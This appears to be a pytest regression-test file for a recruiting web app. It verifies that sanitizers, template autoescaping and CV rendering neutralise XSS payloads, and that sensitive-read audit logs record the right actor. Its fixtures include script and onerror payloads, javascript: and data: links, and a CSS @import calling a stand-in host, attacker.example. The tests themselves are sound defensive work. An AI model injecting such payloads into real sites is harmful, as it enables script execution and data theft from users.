"""Regression tests for persisted rich-text and template XSS paths."""

from types import SimpleNamespace
from unittest.mock import AsyncMock, Mock

import pytest

from app.api.contract_templates import _jinja_env
from app.api.contracts import _wrap_printable
from app.api.phase3_actions import _build_client_proposal_email, _format_jobs_html
from app.services.cv_html_security import sanitize_branded_cv_html
from app.services.cv_html_renderer import _generate_cv_html
from app.services.m365.html_sanitize import sanitize_html
from app.services.security_audit import record_sensitive_read
# Import the relationship target before constructing Activity in this isolated
# unit module.  The production app imports all model modules during startup.
from app.models.skill import Skill as _Skill  # noqa: F401


XSS = '<img src=x onerror="window.__xss=1"><script>alert(1)</script>'


def test_backend_closed_allowlist_strips_active_content() -> None:
    cleaned = sanitize_html(
        XSS
        + '<svg><a href="javascript:alert(2)">x</a></svg>'
        + '<a href="data:text/html,<script>alert(3)</script>" style="x:y">d</a>'
    ).lower()

    assert "<script" not in cleaned
    assert "onerror" not in cleaned
    assert "javascript:" not in cleaned
    assert "data:text/html" not in cleaned
    assert "<svg" not in cleaned
    assert "style=" not in cleaned


def test_contract_jinja_autoescapes_values_from_string_templates() -> None:
    rendered = _jinja_env.from_string("<p>{{ candidate_name }}</p>").render(
        candidate_name=XSS
    )

    assert "<img" not in rendered
    assert "<script" not in rendered
    assert "&lt;img" in rendered
    assert "&lt;script" in rendered


def test_printable_contract_sanitizes_legacy_stored_body() -> None:
    page = _wrap_printable(XSS + "<p>safe</p>", 7, XSS)
    body = page.split("<body>", 1)[1]

    assert "onerror" not in body
    assert "<script>alert(1)</script>" not in body
    assert "<p>safe</p>" in body
    assert "<img" not in page.split("</title>", 1)[0]


def test_shortlist_job_fields_are_escaped() -> None:
    job = SimpleNamespace(
        title=XSS,
        location='Warsaw"><script>alert(2)</script>',
        salary_min=None,
        salary_max=None,
        seniority=None,
    )

    rendered = _format_jobs_html([job])

    assert "<script" not in rendered
    assert "<img" not in rendered
    assert "&lt;script" in rendered


def test_client_proposal_escapes_persisted_candidate_and_job_fields() -> None:
    candidate = SimpleNamespace(competence_category=XSS)
    job = SimpleNamespace(title=XSS)

    result = _build_client_proposal_email(
        candidate,
        job,
        {
            "experience_years": 5,
            "education_level": XSS,
            "skills_summary": [XSS],
            "languages": [XSS],
            "competence_category": XSS,
        },
    )
    rendered = result["html_body"].lower()

    assert "<script" not in rendered
    assert "<img" not in rendered
    assert "javascript:" not in rendered


def test_generated_cv_keeps_static_css_but_sanitizes_its_body() -> None:
    candidate = SimpleNamespace(
        name="A",
        lastname="B",
        email=None,
        phone=None,
        location=None,
        linkedin=None,
        ai_summary=None,
        skills=[],
        experience=[],
        education=[],
        languages=[],
        competence_category="Security",
    )
    raw = _generate_cv_html(candidate, "standard", "pl").replace(
        "</body>", f"{XSS}</body>"
    )

    rendered = sanitize_branded_cv_html(raw)

    assert "<style>" in rendered
    assert "cv-wrapper" in rendered
    assert "<script" not in rendered
    assert "onerror" not in rendered


def test_forged_generated_cv_marker_does_not_trust_arbitrary_css() -> None:
    raw = (
        "<!doctype html><html><head><!-- nexus-generated-cv-v1 -->"
        "<style>@import url(https://attacker.example/leak)</style></head>"
        f"<body><main><p>safe</p>{XSS}</main></body></html>"
    )

    rendered = sanitize_branded_cv_html(raw)

    assert "<style" not in rendered
    assert "@import" not in rendered
    assert "<script" not in rendered
    assert "onerror" not in rendered


def test_generated_cv_escapes_competence_category() -> None:
    candidate = SimpleNamespace(
        name="A",
        lastname="B",
        email=None,
        phone=None,
        location=None,
        linkedin=None,
        ai_summary=None,
        skills=[],
        experience=[],
        education=[],
        languages=[],
        competence_category=XSS,
    )

    rendered = _generate_cv_html(candidate, "standard", "pl")

    assert '<div class="cv-category"><img' not in rendered
    assert "&lt;img" in rendered


@pytest.mark.asyncio
async def test_sensitive_download_audit_omits_payload_and_commits_actor() -> None:
    db = SimpleNamespace(add=Mock(), commit=AsyncMock())
    actor = SimpleNamespace(id=42)

    await record_sensitive_read(
        db,
        user=actor,
        entity_type="candidate_document",
        entity_id=7,
        action="document_downloaded",
        details={"candidate_id": 3},
    )

    activity = db.add.call_args.args[0]
    assert activity.user_id == 42
    assert activity.action == "document_downloaded"
    assert activity.details == {"candidate_id": 3}
    assert activity.external_source == "security_audit"
    db.commit.assert_awaited_once_with()


@pytest.mark.asyncio
async def test_public_document_audit_supports_token_authenticated_reader() -> None:
    db = SimpleNamespace(add=Mock(), commit=AsyncMock())

    await record_sensitive_read(
        db,
        user=None,
        entity_type="document_signature",
        entity_id=9,
        action="document_downloaded",
    )

    activity = db.add.call_args.args[0]
    assert activity.user_id is None
    assert activity.entity_id == 9
    db.commit.assert_awaited_once_with()


@pytest.mark.asyncio
async def test_sensitive_read_audit_attributes_impersonation_to_real_admin() -> None:
    db = SimpleNamespace(add=Mock(), commit=AsyncMock())
    effective_user = SimpleNamespace(id=17, _security_audit_actor_id=3)

    await record_sensitive_read(
        db,
        user=effective_user,
        entity_type="candidate_export",
        entity_id=0,
        action="data_exported",
        details={"format": "csv"},
    )

    activity = db.add.call_args.args[0]
    assert activity.user_id == 3
    assert activity.details == {"format": "csv", "effective_user_id": 17}
    db.commit.assert_awaited_once_with()
